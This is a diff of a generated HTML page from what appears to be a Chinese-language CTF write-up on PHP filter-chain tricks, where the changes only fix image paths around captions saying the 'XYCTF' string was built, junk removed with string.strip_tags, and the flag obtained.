-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174205087.png" class title="image-20240527174205087">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174205087.png" alt="image-20240527174205087"></p>
 <p>可以看到确实成功构造出来了<code>XYCTF</code>，但是由于这里有垃圾数据，就需要用到上面说过的<code>string.strip_tags</code>来过滤掉垃圾数据，如下构造</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174836426.png" class title="image-20240527174836426">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174836426.png" alt="image-20240527174836426"></p>
 <p>最终效果</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174418038.png" class title="image-20240527174418038">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174418038.png" alt="image-20240527174418038"></p>
 <p>再传入题目中：</p>
-<img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174628296.png" class title="image-20240527174628296">
-
+<p><img src="/2024/05/27/%E5%AF%B9php%E7%9A%84filter%E8%BF%87%E6%BB%A4%E5%99%A8%E5%88%A9%E7%94%A8%E7%9A%84%E6%80%BB%E7%BB%93/image-20240527174628296.png" alt="image-20240527174628296"></p>
 <p>得到flag</p>
 <p>参考文章：</p>
 <p><code>https://tttang.com/archive/1395/</code></p>
